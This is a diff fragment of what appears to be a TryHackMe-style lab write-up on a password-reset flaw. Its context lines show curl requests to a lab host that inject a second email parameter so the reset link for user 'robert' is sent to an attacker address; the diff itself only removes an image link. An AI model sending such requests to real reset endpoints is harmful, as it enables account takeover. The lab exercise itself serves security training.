@@ -50,7 +50,6 @@ curl 'http://10.10.115.78/customers/reset?email=robert%40acmeitsupport.thm' -H '
 ````
 curl 'http://10.10.115.78/customers/reset?email=robert%40acmeitsupport.thm' -H 'Content-Type: application/x-www-form-urlencoded' -d 'username=robert&email=attacker@hacker.com'
 ````
-- ![alt text](https://tryhackme-images.s3.amazonaws.com/user-uploads/5efe36fb68daf465530ca761/room-content/3d97e3e37bf9e4db4f95f4f945a7e290.png)
 - Now re-running the curl command we can alter where the reset link is sent
 ````
 curl 'http://10.10.115.78/customers/reset?email=robert@acmeitsupport.thm' -H 'Content-Type: application/x-www-form-urlencoded' -d 'username=robert&email={username}@customer.acmeitsupport.thm'
